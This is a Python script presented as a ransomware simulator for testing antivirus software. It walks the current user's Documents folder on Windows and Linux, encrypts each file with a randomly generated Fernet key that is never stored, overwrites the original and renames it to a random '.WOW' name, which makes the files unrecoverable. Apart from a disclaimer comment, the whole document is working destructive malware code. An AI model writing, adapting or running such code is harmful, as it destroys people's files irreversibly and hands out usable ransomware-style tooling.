# Created by @TheCcortex | Under MIT License #
# IMPORTANT: JUST USE THIS FOR TESTING ANTI-VIRUS SOFTWARE """ONLY""" #
# Please note: Although that this is for testing purposes, It may create critical problems or file loss#
# SO PLEASE USE THIS PYTHON SCRIPT WITH A LOT OF CARE #

import os
import cryptography.fernet as cf
import random
import string
import sys
from alive_progress import *
import time
import colorama as cm

def Warning_Style():
    print(cm.Fore.RED +"[" + cm.Fore.YELLOW + "!" + cm.Fore.RED + "] " + cm.Fore.RESET, end="")

def Info_Style():
    print(cm.Fore.CYAN +"[" + cm.Fore.BLUE + "i" + cm.Fore.CYAN + "] " + cm.Fore.RESET, end="")

def cls():
    #Clear the screen!
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')

Warning_Style()
print("Ransomware was able to load in memory")
Info_Style()
print("Trying to encrypt the files now...")
if sys.platform == "win32":
    try:
        letters = string.ascii_lowercase
        usr = os.getlogin()
        for r,d, files in os.walk("C:\\Users\\"+usr+"\\Documents"):
            with alive_bar(len(files), spinner="dots_waves", theme="classic",length=30,receipt=False,dual_line=True) as bar:
                for file in files:
                    bar.text(cm.Fore.BLUE + "Encrypting " +cm.Fore.GREEN +file+cm.Fore.RESET)
                    ran_name = ''.join(random.choice(letters) for i in range(10))
                    lfile = os.path.join(r, file)
                    lname = os.path.join(r, ran_name + ".WOW")
                    if not "desktop.ini" in lfile:
                        key = cf.Fernet.generate_key()
                        fernet = cf.Fernet(key)
                        with open(lfile, 'rb') as file:
                            original = file.read()
                        encrypted = fernet.encrypt(original)
                        with open(lfile, 'wb') as encrypted_file:
                            encrypted_file.write(encrypted)
                        os.rename(lfile, lname)
                        time.sleep(0.7)
                        bar()
    except PermissionError:
        pass

elif sys.platform == "linux" or sys.platform == "linux2":
    try:
        letters = string.ascii_lowercase
        usr = os.getlogin()
        for r,d, files in os.walk("/home/"+usr+"/Documents"):
            with alive_bar(len(files), spinner="dots_waves", theme="classic",length=30,receipt=False,dual_line=True) as bar:
                for file in files:
                    bar.text(cm.Fore.BLUE + "Encrypting " +cm.Fore.GREEN +file+cm.Fore.RESET)
                    ran_name = ''.join(random.choice(letters) for i in range(10))
                    lfile = os.path.join(r, file)
                    lname = os.path.join(r, ran_name + ".WOW")
                    if not "desktop.ini" in lfile:
                        key = cf.Fernet.generate_key()
                        fernet = cf.Fernet(key)
                        with open(lfile, 'rb') as file:
                            original = file.read()
                        encrypted = fernet.encrypt(original)
                        with open(lfile, 'wb') as encrypted_file:
                            encrypted_file.write(encrypted)
                        os.rename(lfile, lname)
                        time.sleep(0.7)
                        bar()
    except PermissionError:
        pass

time.sleep(0.5)
cls()
print(cm.Fore.GREEN +"""
█▀▀ ▄▀█ ▀█▀ █░█ █▀▀ █▀█ █ █▄░█ █▀▀   █▀█ █▀▀ █▀ █░█ █░░ ▀█▀ █▀ 
█▄█ █▀█ ░█░ █▀█ ██▄ █▀▄ █ █░▀█ █▄█   █▀▄ ██▄ ▄█ █▄█ █▄▄ ░█░ ▄█ ▄ ▄ ▄
""")
Info_Style()
print("Wait a second...")